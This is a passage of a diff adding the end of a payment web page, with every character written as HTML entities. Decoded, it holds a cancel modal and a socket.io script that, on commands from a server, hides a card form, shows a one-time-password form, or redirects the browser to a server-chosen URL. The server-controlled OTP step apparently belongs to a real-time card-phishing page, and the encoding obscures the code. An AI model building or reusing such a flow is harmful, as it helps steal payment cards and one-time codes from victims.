+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#39;<button id="&#99;&#97;&#110;&#99;&#101;&#108;&#78;&#111;" style="&#109;&#97;&#114;&#103;&#105;&#110;&#58;&#32;&#53;&#112;&#120;&#59;&#32;&#112;&#97;&#100;&#100;&#105;&#110;&#103;&#58;&#32;&#53;&#112;&#120;&#32;&#49;&#48;&#112;&#120;&#59;">&#78;&#111;</button>&#39;&#32;&#43;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#39;</div>&#39;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#109;&#111;&#100;&#97;&#108;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#103;&#101;&#116;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#66;&#121;&#73;&#100;&#40;&#34;&#99;&#97;&#110;&#99;&#101;&#108;&#89;&#101;&#115;&#34;&#41;&#46;&#97;&#100;&#100;&#69;&#118;&#101;&#110;&#116;&#76;&#105;&#115;&#116;&#101;&#110;&#101;&#114;&#40;&#34;&#99;&#108;&#105;&#99;&#107;&#34;&#44;&#32;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#104;&#114;&#101;&#102;&#32;&#61;&#32;&#34;&#47;&#102;&#97;&#105;&#108;&#46;&#104;&#116;&#109;&#108;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#103;&#101;&#116;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#66;&#121;&#73;&#100;&#40;&#34;&#99;&#97;&#110;&#99;&#101;&#108;&#78;&#111;&#34;&#41;&#46;&#97;&#100;&#100;&#69;&#118;&#101;&#110;&#116;&#76;&#105;&#115;&#116;&#101;&#110;&#101;&#114;&#40;&#34;&#99;&#108;&#105;&#99;&#107;&#34;&#44;&#32;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#32;&#61;&#32;&#34;&#110;&#111;&#110;&#101;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#32;&#101;&#108;&#115;&#101;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#109;&#111;&#100;&#97;&#108;&#46;&#115;&#116;&#121;&#108;&#101;&#46;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#32;&#61;&#32;&#34;&#102;&#108;&#101;&#120;&#34;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;</script>&#13;
+&#13;
+&#32;&#32;<!-- Socket.io and other existing scripts remain untouched -->&#13;
+&#32;&#32;<script src="&#47;&#115;&#111;&#99;&#107;&#101;&#116;&#46;&#105;&#111;&#47;&#115;&#111;&#99;&#107;&#101;&#116;&#46;&#105;&#111;&#46;&#106;&#115;"></script>&#13;
+&#32;&#32;<script>&#13;
+&#32;&#32;&#32;&#32;&#99;&#111;&#110;&#115;&#116;&#32;&#115;&#111;&#99;&#107;&#101;&#116;&#32;&#61;&#32;&#105;&#111;&#40;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#99;&#111;&#110;&#115;&#116;&#32;&#105;&#110;&#118;&#111;&#105;&#99;&#101;&#73;&#100;&#32;&#61;&#32;&#108;&#111;&#99;&#97;&#108;&#83;&#116;&#111;&#114;&#97;&#103;&#101;&#46;&#103;&#101;&#116;&#73;&#116;&#101;&#109;&#40;&#34;&#105;&#110;&#118;&#111;&#105;&#99;&#101;&#73;&#100;&#34;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#105;&#102;&#32;&#40;&#105;&#110;&#118;&#111;&#105;&#99;&#101;&#73;&#100;&#41;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#115;&#111;&#99;&#107;&#101;&#116;&#46;&#101;&#109;&#105;&#116;&#40;&#39;&#106;&#111;&#105;&#110;&#39;&#44;&#32;&#105;&#110;&#118;&#111;&#105;&#99;&#101;&#73;&#100;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#13;
+&#32;&#32;&#32;&#32;&#115;&#111;&#99;&#107;&#101;&#116;&#46;&#111;&#110;&#40;&#39;&#115;&#104;&#111;&#119;&#95;&#111;&#116;&#112;&#39;&#44;&#32;&#40;&#100;&#97;&#116;&#97;&#41;&#32;&#61;&#62;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#47;&#47;&#32;&#72;&#105;&#100;&#101;&#32;&#99;&#97;&#114;&#100;&#32;&#102;&#111;&#114;&#109;&#44;&#32;&#115;&#104;&#111;&#119;&#32;&#79;&#84;&#80;&#32;&#102;&#111;&#114;&#109;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#103;&#101;&#116;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#66;&#121;&#73;&#100;&#40;&#39;&#112;&#97;&#121;&#109;&#101;&#110;&#116;&#70;&#111;&#114;&#109;&#39;&#41;&#46;&#99;&#108;&#97;&#115;&#115;&#76;&#105;&#115;&#116;&#46;&#97;&#100;&#100;&#40;&#39;&#104;&#105;&#100;&#100;&#101;&#110;&#39;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#103;&#101;&#116;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#66;&#121;&#73;&#100;&#40;&#39;&#111;&#116;&#112;&#70;&#111;&#114;&#109;&#39;&#41;&#46;&#99;&#108;&#97;&#115;&#115;&#76;&#105;&#115;&#116;&#46;&#114;&#101;&#109;&#111;&#118;&#101;&#40;&#39;&#104;&#105;&#100;&#100;&#101;&#110;&#39;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;
+&#32;&#32;&#32;&#32;&#115;&#111;&#99;&#107;&#101;&#116;&#46;&#111;&#110;&#40;&#39;&#114;&#101;&#100;&#105;&#114;&#101;&#99;&#116;&#39;&#44;&#32;&#40;&#100;&#97;&#116;&#97;&#41;&#32;&#61;&#62;&#32;&#123;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#46;&#104;&#114;&#101;&#102;&#32;&#61;&#32;&#100;&#97;&#116;&#97;&#46;&#114;&#101;&#100;&#105;&#114;&#101;&#99;&#116;&#85;&#114;&#108;&#59;&#13;
+&#32;&#32;&#32;&#32;&#125;&#41;&#59;&#13;
+&#32;&#32;</script>&#13;
+</body>&#13;
+</html>&#13;
